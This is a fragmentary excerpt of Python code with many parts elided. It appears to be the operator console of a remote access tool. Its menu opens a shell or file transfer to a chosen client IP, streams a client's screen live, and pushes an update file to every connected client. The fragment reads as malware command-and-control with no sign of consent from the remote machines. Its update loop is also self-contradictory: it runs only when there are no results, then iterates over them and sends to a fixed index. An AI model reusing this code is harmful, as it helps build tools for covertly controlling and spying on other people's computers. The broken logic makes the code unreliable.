...
if __name__ == "__main__":
    ...
    while True:
        ...
        print(colored("[3] Open shell/file transfer to a specific IP by index", 'green'))
        print(colored("[4] Start live screen stream", 'green'))
        print(colored("[5] Stop live screen stream", 'green'))
        print(colored("[6] Update all clients", 'green'))
        ...
        if choice == "1":
            ...
            if not results:
                ...
                while True:
                    message = input(colored("[?] Enter the message to send (type 'help' for help): ", 'cyan'))

                    if message.startswith("send: "):
                        file_name = message.split("send: ")[1]
                        ...
                        print('''
send: <filename>    =   send a file to the ip
get: <filename>     =   request a file from the ip
quit                =   quit this shell''')
            ...
            if not results:
                ...
                new_file = input("[?] Updated file name : ")
                print(colored("[i] This might take a few minutes", 'yellow'))
                cont = input(colored("[?] Do you want to continue (y/n): ", 'cyan'))
                if cont.lower() == 'y':
                    print(colored("[i] Starting Update... Please Wait! (Don't Close)", 'yellow'))
                    print()
                    for ip in results.keys():
                        send_file(ip_list[ip_index], new_file)
                        response = send_message(ip, "update")
                        print(colored(f"[+] Response from {ip}: {response}", 'green'))
                        print()
